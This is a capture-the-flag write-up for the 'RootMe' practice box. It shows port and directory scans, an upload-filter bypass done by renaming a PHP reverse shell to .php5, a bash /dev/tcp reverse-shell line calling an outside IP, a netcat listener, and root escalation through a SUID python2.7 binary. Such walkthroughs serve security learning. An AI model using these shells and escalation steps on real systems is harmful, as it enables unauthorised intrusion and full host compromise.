# Notes brutes - RootMe

Ces notes conservent la trace de résolution originale en anglais. Les walkthroughs propres sont disponibles depuis [README.md](README.md).

# Enumeration

## Rustscan

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 21:6f:36:cc:29:8b:41:7f:44:a8:40:cd:9b:78:78:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqIAVh8HRpYHGJ7C7ou8/gDd0dlAwPwfMJxugovAIcF6ndf78G9GPX+fBndKoGXdXJvCn8kn0le5zpe6tbg6VWFwBL3834z2oCiwz/bYvFkSEfVdMVYCeW/aZ5SgimvcGGqbU6QA2ju4sH4TsnqybqWqdE+ZglfR3UWY67wmVG4Q6lZw2LB6QMD0FdA3JkaLPFBuPzVTXBJAq59MCKtaKDpW8NKlZYreGLuVw7CKKkj98GJlVNL2XxGwUgyxm5K2ZgWp9SqrZ1no5Kybvknup67MytEDjU4hUmx7vRl+ARjTHzMh8qdI+Js2wtJQm2KlJCB6B0gSsVmN3eF38dO1MnMesXOBu9RoMFeOTt4f4ZFoeao2jFu/gAEw5k+P7ypjCsBFpKUcAhyN1WP0+z8Zvh3qZNzCK9l8OG284JQmL9u9tDss4WjKHo05xa7QXSpsJcZH7qVccNgkBhnxiGyzbNPr0egvlPTlvdC+jeLptp/oK7UjGxHqa5aF0eDXGfwzE=
|   256 bf:ab:c7:c6:6f:f8:2f:3e:4f:71:fc:c1:12:c5:cb:47 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDyXhLSSWYsrKxt9EWbWHvfCSn1/qdhpPbBKH3Uw8rsHrIDIf/9V5kKMwk9BqAm7YC4j4DnDuof4kCKM4qSfyA=
|   256 0a:3a:59:1a:65:1d:b6:51:4e:7c:36:76:3f:52:38:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDq97szlXk8PXDrnTh2sKwZtXS0mIrmIRoTDKOxw6m84
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Dirsearch

```bash
Target: http://rootme.thm/

[21:20:25] Starting:                                                                                                                                                      
[21:20:28] 301 -  305B  - /js  ->  http://rootme.thm/js/                    
[21:20:28] 403 -  275B  - /.ht_wsr.txt                                      
[21:20:28] 403 -  275B  - /.htaccess.bak1                                   
[21:20:28] 403 -  275B  - /.htaccess.orig                                   
[21:20:28] 403 -  275B  - /.htaccess.sample
[21:20:29] 403 -  275B  - /.htaccess.save                                   
[21:20:29] 403 -  275B  - /.htaccess_extra                                  
[21:20:29] 403 -  275B  - /.htaccess_orig
[21:20:29] 403 -  275B  - /.htaccess_sc
[21:20:29] 403 -  275B  - /.htaccessOLD
[21:20:29] 403 -  275B  - /.htaccessBAK
[21:20:29] 403 -  275B  - /.htaccessOLD2
[21:20:29] 403 -  275B  - /.htm                                             
[21:20:29] 403 -  275B  - /.html                                            
[21:20:29] 403 -  275B  - /.htpasswd_test
[21:20:29] 403 -  275B  - /.htpasswds                                       
[21:20:29] 403 -  275B  - /.httr-oauth                                      
[21:20:29] 403 -  275B  - /.php                                             
[21:20:41] 301 -  306B  - /css  ->  http://rootme.thm/css/                  
[21:20:48] 200 -  461B  - /js/                                              
[21:20:53] 301 -  308B  - /panel  ->  http://rootme.thm/panel/              
[21:20:53] 200 -  388B  - /panel/                                           
[21:20:58] 403 -  275B  - /server-status/                                   
[21:20:58] 403 -  275B  - /server-status                                    
[21:21:05] 301 -  310B  - /uploads  ->  http://rootme.thm/uploads/          
[21:21:05] 200 -  402B  - /uploads/        
```

- /panel : We can upload files.
- /uploads : The files uploaded from `/panel` could be downloaded from there.

# Exploitation

[https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)

```bash
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/192.168.131.169/4444 0>&1'"); ?>
```

- We create a `php-reverse-shell.php` file.
- We tried uploading it to [http://rootme.thm/panel/](http://rootme.thm/panel/). We had an error message.

![Upload PHP bloqué](screenshots/image%203.png)

- We change the extension file for `php-reverse-shell.php5` and uploaded it successfully.
- We could access the uploaded file from [http://rootme.thm/uploads/](http://rootme.thm/uploads/).
- We started a listener on the attack machine :

```bash
nc -lvnp 4444
```

- We clicked on the `php-reverse-shell.php5` file from [http://rootme.thm/uploads/](http://rootme.thm/uploads/) and got a shell!

![Reverse shell obtenu](screenshots/image%204.png)

- We went to the root folder with `cd  ~` and found the `user.txt`file. We just needed to `cat user.txt`to see the flag!

![Lecture du flag utilisateur](screenshots/image%205.png)

# Privilege Escalation

## SUID

```bash
find / -user root -perm /4000

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/bin/mount
/bin/su
/bin/fusermount
/bin/umount

```

- /usr/bin/python2.7
- On [GTObins](https://gtfobins.github.io/gtfobins/python/), we found the code to make the binary be used as SUID and give us ROOT permissions. It had to be executed from `/usr/bin/python2.7`

```bash
sudo install -m =xs $(which python) .

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

```

- We are root!

![Shell root](screenshots/image%206.png)

- We search for the `root.txt` file :

```bash
find / -type f -name root.txt
```

- Once it was found we checked the content of the file to get the flag!

![Lecture du flag root](screenshots/image%207.png)
